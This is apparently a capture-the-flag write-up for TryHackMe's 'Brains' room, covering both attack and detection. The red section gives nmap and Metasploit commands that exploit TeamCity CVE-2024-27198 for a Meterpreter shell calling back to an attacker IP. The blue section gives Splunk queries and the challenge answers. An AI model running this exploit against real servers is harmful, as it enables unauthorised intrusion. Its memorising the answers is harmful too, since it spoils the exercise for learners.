# [Brains](https://tryhackme.com/room/brains)

## The city forgot to close its gate.

# Red: Exploit the Server!

Welcome to the Brains challenge, part of TryHackMe’s Hackathon!

All brains gathered to build an engineering marvel; however, it seems strangers had found away to get in.

### What is the content of flag.txt in the user's home folder?

1. Perform a full port scan with service and version detection to identify every open port on the target:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:92:5e:2e:0c:95:d3:45:9a:c8:d2:38:e4:5c:1a:ec (RSA)
|   256 0c:5d:cf:b4:e0:97:40:72:93:06:b8:ca:e3:44:be:69 (ECDSA)
|_  256 46:49:60:c6:cf:33:a4:cc:95:07:2f:e6:19:7d:33:0a (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Maintenance
36379/tcp open  java-rmi Java RMI
50000/tcp open  http     Apache Tomcat (language: en)
|_http-title: TeamCity Maintenance &mdash; TeamCity
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Navigate to `http://<TARGET_IP>:50000/login.html`. The page presents the TeamCity login form and reveals the exact build version at the bottom: **Version 2023.11.3**. This version is publicly known to be vulnerable to **CVE-2024-27198**, a critical authentication bypass vulnerability that allows an unauthenticated attacker to perform administrative actions.

3. Launch Metasploit and use the module for CVE-2024-27198. The exploit works by crafting a specially formed URL to the TeamCity REST API that bypasses the authentication filter. It first creates a new administrator account through the unauthenticated endpoint, then authenticates with that account to upload a malicious TeamCity plugin, which executes arbitrary commands on the server and returns a Meterpreter shell:

```bash
msfconsole
use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
set RHOSTS <TARGET_IP>
set RPORT 50000
set LHOST <ATTACKER_IP>
run
```

4. Enumerate the home directory to locate the flag:

```bash
cd /home
ls
cd /ubuntu
ls
cat flag.txt
```

<img width="697" height="522" alt="SCREEN01" src="https://github.com/user-attachments/assets/ef884d19-85a3-4983-b8f4-1fbdc14dcc49" />

---

# Blue: Let's Investigate

Now comes the detection part.

The IT department has provided us one of the servers which was compromised as a result of the attack. Our task as a Forensics Analyst is to examine the host and identify the attacker's footprints in the post-exploitation stage.

**Lab Connection**

Before moving forward, deploy the machine. When you deploy the machine, it will be assigned an IP address: `<TARGET_IP>`. The Splunk instance will be accessible in about 5 minutes and can be accessed at `<TARGET_IP>:8000` using the credentials mentioned below:

**Username:** `splunk`
**Password:** `analyst123`

### What is the name of the backdoor user which was created on the server after exploitation?

1. In the Splunk search bar, query all indexes for `useradd` events to find any user account creation activity. The attacker created a persistent backdoor account after gaining access:

```
index=* useradd
```

<img width="1494" height="469" alt="SCREEN02" src="https://github.com/user-attachments/assets/01de8ee2-0b39-4bcd-af2d-442e07969801" />

**Answer:** `eviluser`

---

### What is the name of the malicious-looking package installed on the server?

1. Search all indexes for package installation events to find any suspicious software installed by the attacker. Package manager activity is captured in the system logs:

```
index=* install
```

Review the results filtered around the date of compromise (`7/4/24`). One package installation event stands out as suspicious.

<img width="1042" height="634" alt="SCREEN03" src="https://github.com/user-attachments/assets/8fda0860-0245-4394-88e9-fa11e98f250a" />

**Answer:** `datacollector`

---

### What is the name of the plugin installed on the server after successful exploitation?

1.  Search all indexes for plugin-related events. The Metasploit module for CVE-2024-27198 achieves code execution by uploading a malicious plugin to the TeamCity server. TeamCity logs plugin activity, so this upload will appear in the logs:

```
index=* plugin
```

<img width="1908" height="471" alt="SCREEN04" src="https://github.com/user-attachments/assets/f0731036-06c5-42a6-ad09-b7a8f85f9c8d" />

**Answer:** `AyzzbuXY.zip`
